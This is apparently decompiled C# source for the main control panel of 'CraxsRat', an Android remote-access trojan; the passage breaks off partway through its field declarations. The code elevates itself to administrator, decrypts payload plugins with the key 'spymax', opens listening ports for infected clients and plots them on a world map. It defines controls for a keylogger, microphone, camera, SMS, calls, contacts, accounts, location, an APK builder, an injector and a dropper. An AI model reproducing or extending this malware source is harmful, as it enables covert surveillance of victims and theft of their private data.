using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Media;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Media;
using Craxs_Rat.My;
using Craxs_Rat.My.Resources;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using LiveCharts.Maps;
using LiveCharts.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Craxs_Rat;

[DesignerGenerated]
public class CraxsRatMain : Form
{
	public delegate void addLogback(object[] objs);

	public delegate void deleNotifidgv(object[] objs);

	public delegate void delecallsidgv(object[] objs);

	public delegate void delealertsidgv(object[] objs);

	public delegate void deleaddnewrow(object[] obj);

	public delegate void updateuiD(object[] objs);

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_29_CraxsRatMain_Load : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal object _0024VB_0024Local_sender;

		internal EventArgs _0024VB_0024Local_e;

		internal CraxsRatMain _0024VB_0024Me;

		internal WindowsIdentity _0024VB_0024ResumableLocal_identity_00240;

		internal WindowsPrincipal _0024VB_0024ResumableLocal_principal_00241;

		internal bool _0024VB_0024ResumableLocal_isElevated_00242;

		internal DialogResult _0024S3;

		internal Padding _0024VB_0024ResumableLocal_padding_00244;

		internal DirectoryInfo _0024VB_0024ResumableLocal_FileDirectory_00245;

		internal FileInfo[] _0024VB_0024ResumableLocal_plug_00246;

		internal string[] _0024VB_0024ResumableLocal_plugExi_00247;

		internal bool _0024VB_0024ResumableLocal_missing_00248;

		internal string[] _0024S9;

		internal int _0024S10;

		internal string _0024VB_0024ResumableLocal_n_002411;

		internal string _0024VB_0024ResumableLocal_pathTest_002412;

		internal FileInfo[] _0024S13;

		internal int _0024S14;

		internal FileInfo _0024VB_0024ResumableLocal_File_002415;

		internal byte[] _0024VB_0024ResumableLocal_by2_002416;

		internal Array _0024VB_0024ResumableLocal_PU2_002417;

		internal byte[] _0024VB_0024ResumableLocal_BY_002418;

		internal Array _0024VB_0024ResumableLocal_PU_002419;

		internal string _0024VB_0024ResumableLocal_WinMM_002420;

		internal FontStyle _0024VB_0024ResumableLocal_F0ntStyle_002421;

		internal string _0024VB_0024ResumableLocal_ttFont_002422;

		internal string _0024S23;

		internal int _0024VB_0024ResumableLocal_F0ntSize_002424;

		internal string _0024VB_0024ResumableLocal_filepath_002425;

		internal string[] _0024VB_0024ResumableLocal_list_002426;

		internal string[] _0024S27;

		internal int _0024S28;

		internal string _0024VB_0024ResumableLocal_lin_002429;

		internal string[] _0024S30;

		internal int _0024S31;

		internal string _0024VB_0024ResumableLocal_p_002432;

		internal int _0024VB_0024ResumableLocal_index_002433;

		internal Exception _0024VB_0024ResumableLocal_ex_002434;

		internal string _0024S35;

		internal IEnumerator _0024S36;

		internal DataGridViewColumn _0024VB_0024ResumableLocal_column_002437;

		internal IEnumerator _0024S38;

		internal DataGridViewColumn _0024VB_0024ResumableLocal_column_002439;

		internal ProcessStartInfo _0024VB_0024ResumableLocal_startInfo_002440;

		internal Process _0024VB_0024ResumableLocal_myprocess_002441;

		internal Exception _0024VB_0024ResumableLocal_ex_002442;

		internal Exception _0024VB_0024ResumableLocal_ex_002443;

		[MethodImpl(MethodImplOptions.NoOptimization)]
		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			checked
			{
				try
				{
					try
					{
						_0024VB_0024ResumableLocal_identity_00240 = WindowsIdentity.GetCurrent();
						_0024VB_0024ResumableLocal_principal_00241 = new WindowsPrincipal(_0024VB_0024ResumableLocal_identity_00240);
						_0024VB_0024ResumableLocal_isElevated_00242 = _0024VB_0024ResumableLocal_principal_00241.IsInRole(WindowsBuiltInRole.Administrator);
						if (_0024VB_0024ResumableLocal_isElevated_00242)
						{
							if (!Directory.Exists(reso.Storepath))
							{
								Directory.CreateDirectory(reso.Storepath);
							}
							if (_0024VB_0024Me.ran == null)
							{
								_0024VB_0024Me.ran = new Random();
							}
							_0024VB_0024Me.Globalvlues = new Dictionary<string, double>();
							_0024VB_0024Me.GlobalMap.EnableZoomingAndPanning = true;
							_0024VB_0024Me.GlobalMap.HeatMap = _0024VB_0024Me.Globalvlues;
							_0024VB_0024Me.GlobalMap.Base.Background = new SolidColorBrush(Colors.Transparent);
							_0024VB_0024Me.GlobalMap.Source = $"{Application.StartupPath}\\\\World.xml";
							((Control)(object)_0024VB_0024Me.GlobalMap).BackColor = System.Drawing.Color.Black;
							((Control)(object)_0024VB_0024Me.GlobalMap).ForeColor = System.Drawing.Color.Black;
							((Control)(object)_0024VB_0024Me.GlobalMap).BackgroundImage = Resources.LOGO;
							((Control)(object)_0024VB_0024Me.GlobalMap).BackgroundImageLayout = ImageLayout.Zoom;
							((Control)(object)_0024VB_0024Me.GlobalMap).Visible = true;
							((Control)(object)_0024VB_0024Me.GlobalMap).Enabled = true;
							((Control)(object)_0024VB_0024Me.GlobalMap).Dock = DockStyle.Fill;
							_0024VB_0024Me.GlobalMap.LandClick += _0024VB_0024Me.Countryclickhandelr;
							_0024VB_0024Me.MapPannel.Controls.Add((Control)(object)_0024VB_0024Me.GlobalMap);
							_0024VB_0024Me.Icon = Resources.max;
							_0024VB_0024Me.Text = string.Format("");
							_0024VB_0024Me.PortsManager = new Ports();
							_0024S3 = _0024VB_0024Me.PortsManager.ShowDialog(_0024VB_0024Me);
							DialogResult dialogResult = _0024S3;
							if (dialogResult != DialogResult.OK)
							{
								_0024VB_0024Me.FormEventArgsClosing();
							}
							_0024VB_0024Me.ClientsWindow.GetType().InvokeMember("DoubleBuffered", BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.SetProperty, null, _0024VB_0024Me.ClientsWindow, new object[1] { true });
							_0024VB_0024Me.ClientsWindow.RowTemplate.DividerHeight = 3;
							_0024VB_0024ResumableLocal_padding_00244 = new Padding(3);
							_0024VB_0024Me.ClientsWindow.RowTemplate.DefaultCellStyle.Padding = _0024VB_0024ResumableLocal_padding_00244;
							_0024VB_0024Me.ClientsWindow.RectColor = System.Drawing.Color.FromArgb(157, 5, 17);
							_0024VB_0024Me.ClientsWindow.GridColor = System.Drawing.Color.FromArgb(0, 0, 0);
							_0024VB_0024ResumableLocal_FileDirectory_00245 = new DirectoryInfo(reso.res_Path + "\\Plugins\\Android");
							_0024VB_0024ResumableLocal_plug_00246 = _0024VB_0024ResumableLocal_FileDirectory_00245.GetFiles("*.pl");
							_0024VB_0024ResumableLocal_plugExi_00247 = "gen-1.pl,gen-2.pl,gen-3.pl,gen-4.pl,gen-5.pl,gen-6.pl,gen-7.pl,gen-8.pl".Split(new string[1] { "," }, StringSplitOptions.None);
							_0024VB_0024ResumableLocal_missing_00248 = false;
							_0024S9 = _0024VB_0024ResumableLocal_plugExi_00247;
							for (_0024S10 = 0; _0024S10 < _0024S9.Length; _0024S10++)
							{
								_0024VB_0024ResumableLocal_n_002411 = _0024S9[_0024S10];
								_0024VB_0024ResumableLocal_pathTest_002412 = $"{_0024VB_0024ResumableLocal_FileDirectory_00245.FullName}\\{_0024VB_0024ResumableLocal_n_002411}";
								if (!File.Exists(_0024VB_0024ResumableLocal_pathTest_002412))
								{
									_0024VB_0024ResumableLocal_missing_00248 = true;
									Interaction.MsgBox($"Missing :{_0024VB_0024ResumableLocal_pathTest_002412}", MsgBoxStyle.Critical, reso.nameRAT);
								}
							}
							if (_0024VB_0024ResumableLocal_missing_00248)
							{
								_0024VB_0024Me.FormEventArgsClosing();
							}
							reso.plug = new List<object>();
							_0024S13 = _0024VB_0024ResumableLocal_plug_00246;
							for (_0024S14 = 0; _0024S14 < _0024S13.Length; _0024S14++)
							{
								_0024VB_0024ResumableLocal_File_002415 = _0024S13[_0024S14];
								if ((Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-4.pl", TextCompare: false) == 0) | (Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-5.pl", TextCompare: false) == 0) | (Operators.CompareString(_0024VB_0024ResumableLocal_File_002415.Name, "gen-1.pl", TextCompare: false) == 0))
								{
									_0024VB_0024ResumableLocal_by2_002416 = File.ReadAllBytes(_0024VB_0024ResumableLocal_File_002415.FullName);
									_0024VB_0024ResumableLocal_PU2_002417 = new object[6]
									{
										reso.domen + "." + reso.Generals(_0024VB_0024ResumableLocal_File_002415.Name.Substring(0, _0024VB_0024ResumableLocal_File_002415.Name.LastIndexOf("."))),
										Conversions.ToString(_0024VB_0024ResumableLocal_plug_00246.Length),
										"rm -r ",
										"dex",
										_0024VB_0024ResumableLocal_by2_002416,
										"ping -c 1 -W 15 "
									};
									reso.plug.Add(_0024VB_0024ResumableLocal_PU2_002417);
								}
								else
								{
									_0024VB_0024ResumableLocal_BY_002418 = Codes.DE(File.ReadAllBytes(_0024VB_0024ResumableLocal_File_002415.FullName), "spymax");
									_0024VB_0024ResumableLocal_PU_002419 = new object[6]
									{
										reso.domen + "." + reso.Generals(_0024VB_0024ResumableLocal_File_002415.Name.Substring(0, _0024VB_0024ResumableLocal_File_002415.Name.LastIndexOf("."))),
										Conversions.ToString(_0024VB_0024ResumableLocal_plug_00246.Length),
										"rm -r ",
										"dex",
										_0024VB_0024ResumableLocal_BY_002418,
										"ping -c 1 -W 15 "
									};
									reso.plug.Add(_0024VB_0024ResumableLocal_PU_002419);
								}
							}
							if (Operators.CompareString(MySettingsProperty.Settings.hidecoonstart, "Yes", TextCompare: false) != 0)
							{
								_0024VB_0024Me.DataLog.Tag = "f";
								_0024VB_0024Me.DataLog.BringToFront();
								_0024VB_0024Me.DataLog.Visible = true;
								_0024VB_0024Me.clearbtn.Visible = true;
							}
							if (Operators.CompareString(MySettingsProperty.Settings._multi_sounds, "Yes", TextCompare: false) == 0)
							{
								Notif_Sound.multi = true;
							}
							else
							{
								Notif_Sound.multi = false;
							}
							_0024VB_0024Me.ClientsWindow.Tag = "f";
							if (File.Exists(Notif_Sound.getsoundpath()))
							{
								Notif_Sound.aMedia = new SoundPlayer();
								Notif_Sound.aMedia.SoundLocation = Notif_Sound.getsoundpath();
								Notif_Sound.aMedia.Load();
							}
							reso.maps = new StringBuilder();
							reso.maps.Append(File.ReadAllText(reso.res_Path + "\\Config\\maps.inf"));
							_0024VB_0024ResumableLocal_WinMM_002420 = reso.MY_Path + "WinMM.Net.dll";
							if (!File.Exists(_0024VB_0024ResumableLocal_WinMM_002420))
							{
								Interaction.MsgBox("Can't Find File WinMM.Net.dll\r\n please Check Windows Defender and extract rat files again");
							}
							else
							{
								_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Regular;
								_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Regular.ttf";
								_0024S23 = MySettingsProperty.Settings.FontStyle;
								string left = _0024S23;
								if (Operators.CompareString(left, "Bold", TextCompare: false) != 0)
								{
									if (Operators.CompareString(left, "Regular", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Regular;
										_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Regular.ttf";
									}
								}
								else
								{
									_0024VB_0024ResumableLocal_F0ntStyle_002421 = FontStyle.Bold;
									_0024VB_0024ResumableLocal_ttFont_002422 = "Hack-Bold.ttf";
								}
								_0024VB_0024ResumableLocal_F0ntSize_002424 = MySettingsProperty.Settings.FontSize;
								reso.f = CustomFont.LoadFont(_0024VB_0024ResumableLocal_ttFont_002422, _0024VB_0024ResumableLocal_F0ntSize_002424, _0024VB_0024ResumableLocal_F0ntStyle_002421);
								reso.FontDrawString = CustomFontDrawString.LoadFont(_0024VB_0024ResumableLocal_ttFont_002422, 11, _0024VB_0024ResumableLocal_F0ntStyle_002421);
								reso.SupportedText = File.ReadAllText(reso.res_Path + "\\Config\\supported_text.inf").ToLower();
								reso.SupportedImages = File.ReadAllText(reso.res_Path + "\\Config\\supported_images.inf").ToLower();
								_0024VB_0024Me.label16.Text = "CraxsRat.vip";
								_0024VB_0024Me.checksavepass.Checked = MySettingsProperty.Settings.savepass;
								if (_0024VB_0024Me.checksavepass.Checked)
								{
									_0024VB_0024ResumableLocal_filepath_002425 = Environment.CurrentDirectory.ToString() + "\\res\\Config\\Pass.inf";
									_0024VB_0024ResumableLocal_list_002426 = File.ReadAllLines(_0024VB_0024ResumableLocal_filepath_002425);
									_0024S27 = _0024VB_0024ResumableLocal_list_002426;
									for (_0024S28 = 0; _0024S28 < _0024S27.Length; _0024S28++)
									{
										_0024VB_0024ResumableLocal_lin_002429 = _0024S27[_0024S28];
										_0024VB_0024Me.passtxt.Text = Codes.AES_Decrypt(_0024VB_0024ResumableLocal_lin_002429, Data.THEKEY);
									}
								}
								_0024S30 = MySettingsProperty.Settings.ports.Split('>');
								for (_0024S31 = 0; _0024S31 < _0024S30.Length; _0024S31++)
								{
									_0024VB_0024ResumableLocal_p_002432 = _0024S30[_0024S31];
									try
									{
										if ((_0024VB_0024ResumableLocal_p_002432 != null) & !string.IsNullOrEmpty(_0024VB_0024ResumableLocal_p_002432))
										{
											_0024VB_0024ResumableLocal_index_002433 = _0024VB_0024Me.DGVSERVS.Rows.Add(Resources.swtchoff, _0024VB_0024ResumableLocal_p_002432, "OFF");
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Cells[2].Style.ForeColor = System.Drawing.Color.Red;
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Cells[0].Tag = "OFF";
											_0024VB_0024Me.DGVSERVS.Rows[_0024VB_0024ResumableLocal_index_002433].Tag = _0024VB_0024ResumableLocal_p_002432;
										}
									}
									catch (Exception ex)
									{
										ProjectData.SetProjectError(ex);
										Exception ex2 = ex;
										_0024VB_0024ResumableLocal_ex_002434 = ex2;
										ProjectData.ClearProjectError();
									}
								}
								reso.SupportedVideo = File.ReadAllText(reso.res_Path + "\\Config\\supported_video.inf").ToLower();
								RegistryHandler.SetUserHandleLimit();
								if (Operators.CompareString(MySettingsProperty.Settings.checkupdatestart, "Yes", TextCompare: false) == 0)
								{
									_0024VB_0024Me.checkupdate.Start();
								}
								_0024S35 = RegistryHandler.Get_Language();
								string left2 = _0024S35;
								if (Operators.CompareString(left2, "CN", TextCompare: false) != 0)
								{
									if (Operators.CompareString(left2, "AR", TextCompare: false) == 0)
									{
										try
										{
											_0024S38 = _0024VB_0024Me.ClientsWindow.Columns.GetEnumerator();
											while (_0024S38.MoveNext())
											{
												_0024VB_0024ResumableLocal_column_002439 = (DataGridViewColumn)_0024S38.Current;
												_0024VB_0024ResumableLocal_column_002439.HeaderText = Codes.Translate(_0024VB_0024ResumableLocal_column_002439.HeaderText, "en", "ar");
											}
										}
										finally
										{
											if (num < 0 && _0024S38 is IDisposable)
											{
												(_0024S38 as IDisposable).Dispose();
											}
										}
									}
								}
								else
								{
									try
									{
										_0024S36 = _0024VB_0024Me.ClientsWindow.Columns.GetEnumerator();
										while (_0024S36.MoveNext())
										{
											_0024VB_0024ResumableLocal_column_002437 = (DataGridViewColumn)_0024S36.Current;
											_0024VB_0024ResumableLocal_column_002437.HeaderText = Codes.Translate(_0024VB_0024ResumableLocal_column_002437.HeaderText, "en", "zh");
										}
									}
									finally
									{
										if (num < 0 && _0024S36 is IDisposable)
										{
											(_0024S36 as IDisposable).Dispose();
										}
									}
								}
								_0024VB_0024Me.TOpacity.Interval = SpySettings.T_Interval;
								_0024VB_0024Me.TOpacity.Enabled = true;
								_0024VB_0024Me.PortsManager.StartPosition = FormStartPosition.CenterScreen;
								_0024VB_0024Me.NotifyI();
								reso.NewIcon(reso.res_Path + "\\Icons\\apk.ico", ".apk");
								_0024VB_0024Me.monitortimer.Start();
								_0024VB_0024Me.mapworker.RunWorkerAsync();
								_0024VB_0024Me.Statustimer.Start();
								_0024VB_0024Me.Opacity = 1.0;
								CraxsAlert.ShowSucess("Welcome to CraxsRat");
							}
						}
						else
						{
							_0024VB_0024ResumableLocal_startInfo_002440 = new ProcessStartInfo();
							_0024VB_0024ResumableLocal_myprocess_002441 = new Process();
							_0024VB_0024ResumableLocal_startInfo_002440.FileName = Application.ExecutablePath;
							_0024VB_0024ResumableLocal_startInfo_002440.Verb = "runas";
							_0024VB_0024ResumableLocal_myprocess_002441.StartInfo = _0024VB_0024ResumableLocal_startInfo_002440;
							try
							{
								_0024VB_0024ResumableLocal_myprocess_002441.Start();
							}
							catch (Exception ex3)
							{
								ProjectData.SetProjectError(ex3);
								Exception ex4 = ex3;
								_0024VB_0024ResumableLocal_ex_002442 = ex4;
								ProjectData.ClearProjectError();
							}
							finally
							{
								if (num < 0)
								{
									ProjectData.EndApp();
								}
							}
						}
					}
					catch (Exception ex5)
					{
						ProjectData.SetProjectError(ex5);
						Exception ex6 = ex5;
						_0024VB_0024ResumableLocal_ex_002443 = ex6;
						throw new Exception("Global Error:" + _0024VB_0024ResumableLocal_ex_002443.Message);
					}
				}
				catch (Exception ex7)
				{
					ProjectData.SetProjectError(ex7);
					Exception exception = ex7;
					_0024State = -2;
					_0024Builder.SetException(exception);
					ProjectData.ClearProjectError();
					return;
				}
				num = -2;
				_0024State = -2;
				_0024Builder.SetResult();
			}
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__57_002D0
	{
		public DataGridViewRow _0024VB_0024Local_row;

		public string _0024VB_0024Local_uuid;

		public CraxsRatMain _0024VB_0024Me;

		public _Closure_0024__57_002D0(_Closure_0024__57_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_row = arg0._0024VB_0024Local_row;
				_0024VB_0024Local_uuid = arg0._0024VB_0024Local_uuid;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.RemoveCard(_0024VB_0024Local_row, _0024VB_0024Local_uuid);
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_109_smoothfadedout : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Form _0024VB_0024Local_targetform;

		internal int _0024VB_0024Local_slowtime;

		internal CraxsRatMain _0024VB_0024Me;

		internal Form _0024S0;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				TaskAwaiter awaiter;
				if (num == 0)
				{
					num = -1;
					_0024State = -1;
					awaiter = _0024A0;
					_0024A0 = default(TaskAwaiter);
					goto IL_0042;
				}
				goto IL_007a;
				IL_007a:
				if (_0024VB_0024Local_targetform.Opacity > 0.0)
				{
					awaiter = Task.Delay(_0024VB_0024Local_slowtime).GetAwaiter();
					if (!awaiter.IsCompleted)
					{
						num = 0;
						_0024State = 0;
						_0024A0 = awaiter;
						ref AsyncVoidMethodBuilder reference = ref _0024Builder;
						VB_0024StateMachine_109_smoothfadedout stateMachine = this;
						reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
						return;
					}
					goto IL_0042;
				}
				_0024VB_0024Local_targetform.Opacity = 0.0;
				_0024VB_0024Me.Close();
				goto end_IL_0007;
				IL_0042:
				awaiter.GetResult();
				awaiter = default(TaskAwaiter);
				(_0024S0 = _0024VB_0024Local_targetform).Opacity = _0024S0.Opacity - 0.05;
				goto IL_007a;
				end_IL_0007:;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception exception = ex;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__173_002D0
	{
		public Dictionary<string, double> _0024VB_0024Local_keyValues;

		public _Closure_0024__173_002D0(_Closure_0024__173_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_keyValues = arg0._0024VB_0024Local_keyValues;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			Data.MainForm.GlobalMap.HeatMap = _0024VB_0024Local_keyValues;
			((Control)(object)Data.MainForm.GlobalMap).Update();
		}
	}

	[CompilerGenerated]
	internal sealed class _Closure_0024__212_002D0
	{
		public string _0024VB_0024Local_portnumber;

		public CraxsRatMain _0024VB_0024Me;

		public _Closure_0024__212_002D0(_Closure_0024__212_002D0 arg0)
		{
			if (arg0 != null)
			{
				_0024VB_0024Local_portnumber = arg0._0024VB_0024Local_portnumber;
			}
		}

		[SpecialName]
		internal void _Lambda_0024__0()
		{
			_0024VB_0024Me.server.Add(new Accept(_0024VB_0024Local_portnumber));
		}
	}

	public string PORTs;

	public List<Accept> server;

	private string Myname;

	private int xt_err;

	public bool Alive;

	public static bool ISDB;

	public static int MyStatus;

	private int Mx;

	private int Min;

	private int Sw;

	private int Sh;

	private bool mov;

	public string DKF;

	public string DKD;

	public Ports PortsManager;

	public GeoMap GlobalMap;

	public Dictionary<string, double> Globalvlues;

	public System.Threading.Timer _timer;

	private CraxsAbout A;

	public Build B;

	public CraxsStore store;

	public BackgroundWorker[] Workers;

	private object NumWorkers;

	public clsComputerInfo SCANER;

	public Win_Users WU;

	private CraxsSettings CYPHERSETTNGS;

	private string temptext;

	private string temptext2;

	public Jector JC;

	public bool isactive;

	private List<DataGridViewRow> searchbefore;

	public Random ran;

	public Apk_studio ST;

	public Drooper DR;

	private IContainer components;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("notfi")]
	[CompilerGenerated]
	private NotifyIcon _notfi;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TopPanel")]
	private Panel _TopPanel;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearbtn")]
	private DrakeUIAvatar _clearbtn;

	[AccessedThroughProperty("PictureBox1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private PictureBox _PictureBox1;

	[CompilerGenerated]
	[AccessedThroughProperty("Panel3")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Panel _Panel3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("infolowtext")]
	[CompilerGenerated]
	private Label _infolowtext;

	[CompilerGenerated]
	[AccessedThroughProperty("Home_Btn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _Home_Btn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("Build_btn")]
	private DrakeUIButtonIcon _Build_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("inject_btn")]
	private DrakeUIButtonIcon _inject_btn;

	[AccessedThroughProperty("Settings_btn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _Settings_btn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("About_btn")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _About_btn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("searchbtn")]
	private DrakeUIAvatar _searchbtn;

	[AccessedThroughProperty("searchtext")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUITextBox _searchtext;

	[AccessedThroughProperty("uncheckbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _uncheckbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon8")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon8;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("HBlockbtn")]
	private DrakeUIButtonIcon _HBlockbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Hinfobtn")]
	private DrakeUIButtonIcon _Hinfobtn;

	[AccessedThroughProperty("clientfoldrbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _clientfoldrbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon9")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon9;

	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon13")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _DrakeUIButtonIcon13;

	[AccessedThroughProperty("DrakeUIButtonIcon12")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _DrakeUIButtonIcon12;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BlockClientToolStripMenuItem")]
	[CompilerGenerated]
	private ToolStripMenuItem _BlockClientToolStripMenuItem;

	[AccessedThroughProperty("ToolStripMenuItem1")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _ToolStripMenuItem1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clearsrchbtn")]
	private DrakeUIAvatar _clearsrchbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("supportbtn")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _supportbtn;

	[AccessedThroughProperty("locationbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _locationbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("keyloggerbtn")]
	private DrakeUIButtonIcon _keyloggerbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("callsbtn")]
	private DrakeUIButtonIcon _callsbtn;

	[AccessedThroughProperty("micbtn")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _micbtn;

	[AccessedThroughProperty("accountbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _accountbtn;

	[AccessedThroughProperty("camerabtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _camerabtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("applicationsbtn")]
	[CompilerGenerated]
	private DrakeUIButtonIcon _applicationsbtn;

	[CompilerGenerated]
	[AccessedThroughProperty("screenbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private DrakeUIButtonIcon _screenbtn;

	[AccessedThroughProperty("contactbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _contactbtn;

	[AccessedThroughProperty("screenreadbtn")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private DrakeUIButtonIcon _screenreadbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("filebtn")]
	private DrakeUIButtonIcon _filebtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("smsbtn")]
	private DrakeUIButtonIcon _smsbtn;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	[AccessedThroughProperty("DrakeUIButtonIcon2")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon2;

	[AccessedThroughProperty("FilesToolStripMenuItem")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private ToolStripMenuItem _FilesToolStripMenuItem;

	[AccessedThroughProperty("SMSToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _SMSToolStripMenuItem;

	[AccessedThroughProperty("CallsToolStripMenuItem1")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _CallsToolStripMenuItem1;

	[AccessedThroughProperty("ContactsToolStripMenuItem")]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private ToolStripMenuItem _ContactsToolStripMenuItem;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("AccountsToolStripMenuItem")]
	[CompilerGenerated]
	private ToolStripMenuItem _AccountsToolStripMenuItem;

	[CompilerGenerated]
